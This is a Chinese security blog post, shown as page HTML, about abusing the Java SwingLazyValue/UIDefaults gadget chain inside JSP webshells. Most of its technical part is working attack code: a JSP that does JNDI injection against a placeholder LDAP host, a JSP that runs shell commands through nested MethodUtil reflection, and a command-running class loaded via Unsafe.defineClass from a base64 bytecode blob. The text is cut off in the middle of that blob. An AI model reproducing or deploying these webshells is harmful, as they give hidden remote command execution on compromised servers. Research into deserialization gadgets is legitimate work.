@@ -1,0 +1,686 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>SwingLazyValue在WebShell下的利用 - </title><meta name="Description" content="SwingLazyValue在WebShell下的利用"><meta property="og:title" content="SwingLazyValue在WebShell下的利用" />
+<meta property="og:description" content="SwingLazyValue在WebShell下的利用" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://yzddmr6.com/posts/swinglazyvalue-in-webshell/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-07-16T18:19:24+00:00" />
+<meta property="article:modified_time" content="2023-07-16T18:19:24+00:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp"/>
+
+<meta name="twitter:title" content="SwingLazyValue在WebShell下的利用"/>
+<meta name="twitter:description" content="SwingLazyValue在WebShell下的利用"/>
+<meta name="application-name" content="yzddMr6&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="yzddMr6&#39;s Blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://yzddmr6.com/posts/swinglazyvalue-in-webshell/" /><link rel="prev" href="https://yzddmr6.com/posts/sharpalternativeshellcodeexec/" /><link rel="next" href="https://yzddmr6.com/posts/gzh/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "SwingLazyValue在WebShell下的利用",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/yzddmr6.com\/posts\/swinglazyvalue-in-webshell\/"
+        },"genre": "posts","wordcount":  2313 ,
+        "url": "https:\/\/yzddmr6.com\/posts\/swinglazyvalue-in-webshell\/","datePublished": "2023-07-16T18:19:24+00:00","dateModified": "2023-07-16T18:19:24+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/yzddmr6.com\/images\/avatar.webp",
+                    "width":  640 ,
+                    "height":  640 
+                }},"author": {
+                "@type": "Person",
+                "name": "yzddMr6"
+            },"description": "SwingLazyValue在WebShell下的利用"
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="">yzddMr6&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/showcase/"> 作品 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="切换主题">
+                        <option value="light">浅色</option>
+                        <option value="dark">深色</option>
+                        <option value="black">黑色</option>
+                        <option value="auto">跟随系统</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="">yzddMr6&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/showcase/" title="">作品</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="切换主题">
+                    <option value="light">浅色</option>
+                    <option value="dark">深色</option>
+                    <option value="black">黑色</option>
+                    <option value="auto">跟随系统</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#背景">背景</a></li>
+    <li><a href="#原理">原理</a></li>
+    <li><a href="#利用">利用</a>
+      <ul>
+        <li><a href="#利用一jndi注入">利用一：JNDI注入</a></li>
+        <li><a href="#利用二套娃反射执行命令">利用二：套娃反射执行命令</a></li>
+        <li><a href="#利用三defineclass加载字节码">利用三：defineClass加载字节码</a></li>
+        <li><a href="#利用四bcel加载字节码">利用四：BCEL加载字节码</a></li>
+        <li><a href="#利用五落盘xslt并加载">利用五：落盘XSLT并加载</a></li>
+      </ul>
+    </li>
+    <li><a href="#优化">优化</a></li>
+    <li><a href="#最后">最后</a></li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">SwingLazyValue在WebShell下的利用</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="https://github.com/yzddmr6" title="Author" target="_blank" rel="noopener noreferrer author" class="author">yzddMr6</a>
+                </span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2023-07-16">2023-07-16</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2023-07-16">2023-07-16</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 2313 字&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 5 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#背景">背景</a></li>
+    <li><a href="#原理">原理</a></li>
+    <li><a href="#利用">利用</a>
+      <ul>
+        <li><a href="#利用一jndi注入">利用一：JNDI注入</a></li>
+        <li><a href="#利用二套娃反射执行命令">利用二：套娃反射执行命令</a></li>
+        <li><a href="#利用三defineclass加载字节码">利用三：defineClass加载字节码</a></li>
+        <li><a href="#利用四bcel加载字节码">利用四：BCEL加载字节码</a></li>
+        <li><a href="#利用五落盘xslt并加载">利用五：落盘XSLT并加载</a></li>
+      </ul>
+    </li>
+    <li><a href="#优化">优化</a></li>
+    <li><a href="#最后">最后</a></li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><meta name="referrer" content="no-referrer" />
+<h2 id="背景" class="headerLink">
+    <a href="#%e8%83%8c%e6%99%af" class="header-mark"></a>1 背景</h2><p>在Hessian相关的反序列化场景下经常会看到这个链子，本文列举分析一些常见的利用，并且融入到WebShell场景。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">UIDefaults.get
+</span></span><span class="line"><span class="cl">  UIDefaults.getFromHashTable
+</span></span><span class="line"><span class="cl">    UIDefaults$LazyValue.createValue
+</span></span><span class="line"><span class="cl">      SwingLazyValue.createValue
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="原理" class="headerLink">
+    <a href="#%e5%8e%9f%e7%90%86" class="header-mark"></a>2 原理</h2><p>SwingLazyValue.createValue可以实现一个任意方法的反射，相当于一个反射的包装类。</p>
+<p>限制：var2是个Class，不是实例化后的Object对象，所以只能调用静态方法来实现gadgets，因为反射调用静态方法的时候第一个参数可以随便填。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2023/png/1599908/1689477120461-b4e1133d-82ec-4fd4-ac48-c0b83d7e640c.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2023/png/1599908/1689477120461-b4e1133d-82ec-4fd4-ac48-c0b83d7e640c.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2023/png/1599908/1689477120461-b4e1133d-82ec-4fd4-ac48-c0b83d7e640c.png"
+            srcset="https://cdn.nlark.com/yuque/0/2023/png/1599908/1689477120461-b4e1133d-82ec-4fd4-ac48-c0b83d7e640c.png, https://cdn.nlark.com/yuque/0/2023/png/1599908/1689477120461-b4e1133d-82ec-4fd4-ac48-c0b83d7e640c.png 1.5x, https://cdn.nlark.com/yuque/0/2023/png/1599908/1689477120461-b4e1133d-82ec-4fd4-ac48-c0b83d7e640c.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h2 id="利用" class="headerLink">
+    <a href="#%e5%88%a9%e7%94%a8" class="header-mark"></a>3 利用</h2><h3 id="利用一jndi注入" class="headerLink">
+    <a href="#%e5%88%a9%e7%94%a8%e4%b8%80jndi%e6%b3%a8%e5%85%a5" class="header-mark"></a>3.1 利用一：JNDI注入</h3><p>invoke一个任意静态函数，比较容易想到JNDI注入InitialContext.doLookup()</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">javax.swing.UIDefaults#get
+</span></span><span class="line"><span class="cl">	sun.swing.SwingLazyValue#createValue
+</span></span><span class="line"><span class="cl">  	javax.naming.InitialContext#doLookup
+</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;javax.swing.*&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%
+</span></span><span class="line"><span class="cl">    Object o = new sun.swing.SwingLazyValue(&#34;javax.naming.InitialContext&#34;, &#34;doLookup&#34;, new Object[]{&#34;ldap://xxxx&#34;});
+</span></span><span class="line"><span class="cl">    UIDefaults uiDefaults = new UIDefaults();
+</span></span><span class="line"><span class="cl">    uiDefaults.put(&#34;aaa&#34;, o);
+</span></span><span class="line"><span class="cl">    uiDefaults.get(&#34;aaa&#34;);
+</span></span><span class="line"><span class="cl">%&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>起个恶意的ldap即可利用，但是有版本限制，并且需要出网</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2023/png/1599908/1689477177921-672ce602-2e6d-40be-9c8d-2336ad73abbb.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2023/png/1599908/1689477177921-672ce602-2e6d-40be-9c8d-2336ad73abbb.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2023/png/1599908/1689477177921-672ce602-2e6d-40be-9c8d-2336ad73abbb.png"
+            srcset="https://cdn.nlark.com/yuque/0/2023/png/1599908/1689477177921-672ce602-2e6d-40be-9c8d-2336ad73abbb.png, https://cdn.nlark.com/yuque/0/2023/png/1599908/1689477177921-672ce602-2e6d-40be-9c8d-2336ad73abbb.png 1.5x, https://cdn.nlark.com/yuque/0/2023/png/1599908/1689477177921-672ce602-2e6d-40be-9c8d-2336ad73abbb.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="利用二套娃反射执行命令" class="headerLink">
+    <a href="#%e5%88%a9%e7%94%a8%e4%ba%8c%e5%a5%97%e5%a8%83%e5%8f%8d%e5%b0%84%e6%89%a7%e8%a1%8c%e5%91%bd%e4%bb%a4" class="header-mark"></a>3.2 利用二：套娃反射执行命令</h3><p>这个操作其实比较秀了，刚才提到var2只能是一个Class，只能调用一个静态方法，而MethodUtil.invoke就刚好是一个符合条件的利用点，所以我们可以通过套娃反射一个MethodUtil.invoke，将真正想要调用的类方法放到其参数中来突破这一限制。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">&lt;%@ page import=&#34;sun.reflect.misc.MethodUtil&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;java.lang.reflect.Method&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;sun.swing.SwingLazyValue&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;javax.swing.*&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%
+</span></span><span class="line"><span class="cl">    Method invoke = MethodUtil.class.getMethod(&#34;invoke&#34;, Method.class, Object.class, Object[].class);
+</span></span><span class="line"><span class="cl">    Method exec = Runtime.class.getMethod(&#34;exec&#34;, String[].class);
+</span></span><span class="line"><span class="cl">    String[] command = new String[]{&#34;sh&#34;, &#34;-c&#34;, &#34;open /&#34;};
+</span></span><span class="line"><span class="cl">    SwingLazyValue swingLazyValue = new SwingLazyValue(&#34;sun.reflect.misc.MethodUtil&#34;, &#34;invoke&#34;, new Object[]{invoke, new Object(), new Object[]{exec, Runtime.getRuntime(), new Object[]{command}}});
+</span></span><span class="line"><span class="cl">    UIDefaults u1 = new UIDefaults();
+</span></span><span class="line"><span class="cl">    u1.put(&#34;key&#34;, swingLazyValue);
+</span></span><span class="line"><span class="cl">    u1.get(&#34;key&#34;);
+</span></span><span class="line"><span class="cl">%&gt;
+</span></span><span class="line"><span class="cl">exec:485, Runtime (java.lang)
+</span></span><span class="line"><span class="cl">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+</span></span><span class="line"><span class="cl">invoke:62, NativeMethodAccessorImpl (sun.reflect)
+</span></span><span class="line"><span class="cl">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+</span></span><span class="line"><span class="cl">invoke:498, Method (java.lang.reflect)
+</span></span><span class="line"><span class="cl">invoke:71, Trampoline (sun.reflect.misc)
+</span></span><span class="line"><span class="cl">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+</span></span><span class="line"><span class="cl">invoke:62, NativeMethodAccessorImpl (sun.reflect)
+</span></span><span class="line"><span class="cl">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+</span></span><span class="line"><span class="cl">invoke:498, Method (java.lang.reflect)
+</span></span><span class="line"><span class="cl">invoke:275, MethodUtil (sun.reflect.misc)
+</span></span><span class="line"><span class="cl">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+</span></span><span class="line"><span class="cl">invoke:62, NativeMethodAccessorImpl (sun.reflect)
+</span></span><span class="line"><span class="cl">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+</span></span><span class="line"><span class="cl">invoke:498, Method (java.lang.reflect)
+</span></span><span class="line"><span class="cl">invoke:71, Trampoline (sun.reflect.misc)
+</span></span><span class="line"><span class="cl">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+</span></span><span class="line"><span class="cl">invoke:62, NativeMethodAccessorImpl (sun.reflect)
+</span></span><span class="line"><span class="cl">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+</span></span><span class="line"><span class="cl">invoke:498, Method (java.lang.reflect)
+</span></span><span class="line"><span class="cl">invoke:275, MethodUtil (sun.reflect.misc)
+</span></span><span class="line"><span class="cl">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+</span></span><span class="line"><span class="cl">invoke:62, NativeMethodAccessorImpl (sun.reflect)
+</span></span><span class="line"><span class="cl">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+</span></span><span class="line"><span class="cl">invoke:498, Method (java.lang.reflect)
+</span></span><span class="line"><span class="cl">createValue:73, SwingLazyValue (sun.swing)
+</span></span><span class="line"><span class="cl">getFromHashtable:216, UIDefaults (javax.swing)
+</span></span><span class="line"><span class="cl">get:161, UIDefaults (javax.swing)
+</span></span><span class="line"><span class="cl">main:19, poc2 (SwingLazyValue)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="利用三defineclass加载字节码" class="headerLink">
+    <a href="#%e5%88%a9%e7%94%a8%e4%b8%89defineclass%e5%8a%a0%e8%bd%bd%e5%ad%97%e8%8a%82%e7%a0%81" class="header-mark"></a>3.3 利用三：defineClass加载字节码</h3><p>既然我们已经可以做到不受静态方法的限制做到任意方法的调用，那么我们就可以通过套娃反射调用sun.misc.Unsafe#defineClass</p>
+<p>准备好一个恶意类，通过System-property来传递要执行的命令</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">public class exp {
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    static {
+</span></span><span class="line"><span class="cl">        String cmd = System.getProperty(&#34;cmd&#34;);
+</span></span><span class="line"><span class="cl">        StringBuilder stringBuilder = new StringBuilder();
+</span></span><span class="line"><span class="cl">        BufferedReader bufferedReader;
+</span></span><span class="line"><span class="cl">        try {
+</span></span><span class="line"><span class="cl">            bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd.split(&#34; &#34;)).getInputStream()));
+</span></span><span class="line"><span class="cl">            String line;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            while ((line = bufferedReader.readLine()) != null) {
+</span></span><span class="line"><span class="cl">                stringBuilder.append(line).append(&#34;\n&#34;);
+</span></span><span class="line"><span class="cl">            }
+</span></span><span class="line"><span class="cl">        } catch (IOException e) {
+</span></span><span class="line"><span class="cl">            e.printStackTrace();
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">        System.setProperty(&#34;ret&#34;, stringBuilder.toString());
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">javax.swing.UIDefaults#get
+</span></span><span class="line"><span class="cl">	sun.swing.SwingLazyValue#createValue
+</span></span><span class="line"><span class="cl">  	sun.reflect.misc.MethodUtil#invoke
+</span></span><span class="line"><span class="cl">    	sun.misc.Unsafe#defineClass
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里要触发两次UIDefaults.get，第一次是加载恶意类，第二次是Class.forName触发恶意类的static代码块</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">&lt;%@ page import=&#34;java.util.Hashtable&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;javax.swing.*&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;sun.swing.SwingLazyValue&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;java.lang.reflect.Method&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;sun.reflect.misc.MethodUtil&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;sun.misc.BASE64Decoder&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;sun.misc.Unsafe&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;java.security.ProtectionDomain&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;java.lang.reflect.Field&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%
+</span></span><span class="line"><span class="cl">    byte[] bcode = new BASE64Decoder().decodeBuffer(&#34;yv66vgAAADQAYwoAGAAxCAAnCgAyADMHADQKAAQAMQcANQcANgoANwA4CAA5CgA6ADsKADcAPAoAPQA+CgAHAD8KAAYAQAoABgBBCgAEAEIIAEMHAEQKABIARQgARgoABABHCgAyAEgHAEkHAEoBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEABUxleHA7AQAIPGNsaW5pdD4BAARsaW5lAQASTGphdmEvbGFuZy9TdHJpbmc7AQAOYnVmZmVyZWRSZWFkZXIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQADY21kAQANc3RyaW5nQnVpbGRlcgEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAA1TdGFja01hcFRhYmxlBwBLBwA0BwA1BwBEAQAKU291cmNlRmlsZQEACGV4cC5qYXZhDAAZABoHAEwMAE0ATgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIHAE8MAFAAUQEAASAHAEsMAFIAUwwAVABVBwBWDABXAFgMABkAWQwAGQBaDABbAFwMAF0AXgEAAQoBABNqYXZhL2lvL0lPRXhjZXB0aW9uDABfABoBAANyZXQMAGAAXAwAYQBiAQADZXhwAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABXNwbGl0AQAnKExqYXZhL2xhbmcvU3RyaW5nOylbTGphdmEvbGFuZy9TdHJpbmc7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAD3ByaW50U3RhY2tUcmFjZQEACHRvU3RyaW5nAQALc2V0UHJvcGVydHkBADgoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwAh